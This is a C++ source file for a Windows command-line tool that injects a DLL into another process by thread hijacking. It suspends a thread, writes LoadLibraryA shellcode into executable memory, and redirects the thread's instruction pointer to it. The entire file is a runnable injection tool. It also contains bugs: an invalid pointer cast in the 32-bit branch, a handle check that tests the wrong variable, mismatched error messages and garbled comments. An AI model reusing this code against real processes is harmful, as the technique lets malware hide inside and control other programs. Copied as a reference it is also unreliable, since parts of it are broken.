#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int Error(const char* msg) {
	printf("%s (%u)\n", msg, GetLastError());
	return 1;
}

int GetFirstThreadInProcess(int pid) {
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	THREADENTRY32 te = { sizeof(te) };
	if (!Thread32First(hSnapshot, &te)) {
		CloseHandle(hSnapshot);
		return 0;
	}

	int tid = 0;
	do {
		if (te.th32OwnerProcessID == pid) {
			tid = te.th32ThreadID;
			break;
		}
	} while (Thread32Next(hSnapshot, &te));

	CloseHandle(hSnapshot);
	return tid;
}

bool Inject(HANDLE hProcess, HANDLE hThread, PCSTR dllPath) {
//#ifndef _WIN64
//	void __declspec(naked) InjectedFunction() {
//		__asm {
//			pushad
//			push	11111111h
//			mov		eax, 22222222h
//			call	ezx
//			popad
//			push	33333333h
//			ret
//		}
//	}
//#endif

#ifdef _WIN64
	BYTE code[] = {
		// sub rsp 28h
		0x48, 0x83, 0xec, 0x28,
		// mov [rsp + 18], rax
		0x48, 0x89, 0x44, 0x24, 0x18,
		// mov [rsp + 10h], rcx
		0x48, 0x89, 0x4c, 0x24, 0x10,
		// mov rcx, 111111111111111111h
		0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
		// mov rax, 222222222222222222h
		0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		// call rax
		0xff, 0xd0,
		// mov rcx, [rsp, 10h]
		0x48, 0x8b, 0x4c, 0x24, 0x10,
		// mov rax, [rsp, 18h]
		0x48, 0x8b, 0x44, 0x24, 0x18,
		// add rsp, 28h
		0x48, 0x83, 0xc4, 0x28,
		// mov r11, 333333333333333333h
		0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
		// jmp r11
		0x41, 0xff, 0xe3
	};
#else
	BYTE code[] = {
		0x60,
		0x68, 0x11, 0x11, 0x11, 0x11,
		0xb8, 0x22, 0x22, 0x22, 0x22,
		0xff, 0xd0,
		0x61,
		0x68, 0x33, 0x33, 0x33, 0x33,
		0xc3
	};
#endif
	const int page_size = 1 << 12;

	// allocate buffer in target process for dll path and injected function code
	auto buffer = (char*)VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!buffer)
		return false;

	// sus[emd tje target tjread amd get thread context
	if (SuspendThread(hThread) == -1)
		return false;
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx)) {
		ResumeThread(hThread);
			return false;
	}

	void* loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA");
#ifdef _WIN64
	// set dll path
	*(PVOID*)(code + 0x10) = (void*)(buffer + page_size / 2);
	// set LoadLibraryA address
	*(PVOID*)(code + 0x1a) = loadLibraryAddress;
	// jump address (back to the original code)
	*(unsigned long long*)(code + 0x34) = ctx.Rip;
#else
	// set dll path
	*(PVOID*)(code + 2) = (void*)(buffer + page_size / 2);
	// set LoadLibraryA address
	*(PVOID)(code + 7) = loadLibraryAddress;
	// jump address (back to the original code)
	*(unsigned*)(code + 0xf) = ctx.Eip;
#endif
	// copy injected function into the buffer
	if (!WriteProcessMemory(hProcess, buffer, code, sizeof(code), nullptr)) {
		ResumeThread(hThread);
		return false;
	}

	// copy the dll name into the buffer
	if (!WriteProcessMemory(hProcess, buffer + page_size / 2, dllPath, strlen(dllPath), nullptr)) {
		ResumeThread(hThread);
		return false;
	}

	// change threat context and resume
#ifdef _WIN64
	ctx.Rip = (unsigned long long)buffer;  
#else
	ctx.Eip = (DWORD)buffer;
#endif

	if (!SetThreadContext(hThread, &ctx))
		return false;

	ResumeThread(hThread);
	return true;
}

int main(int argc, const char** argv) {
	if (argc < 3) {
		printf("Usage: ThreadHijack <pid> <dll path>\n");
		return 0;
	}

	int pid = atoi(argv[1]);

	// open handle to process with permission to allocate and write.
	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess)
		return Error("Error opening process");

	// get the thread id for the first thrid found in given pid
	DWORD tid = GetFirstThreadInProcess(pid);

	// open handle to thread
	auto hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, tid);
	if (!hProcess)
		return Error("failed to open process handle");

	if (!Inject(hProcess, hThread, argv[2]))
		return Error("Failed to open thread");

	// wake up thread if it has UI
	PostThreadMessage(tid, WM_NULL, 0, 0);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
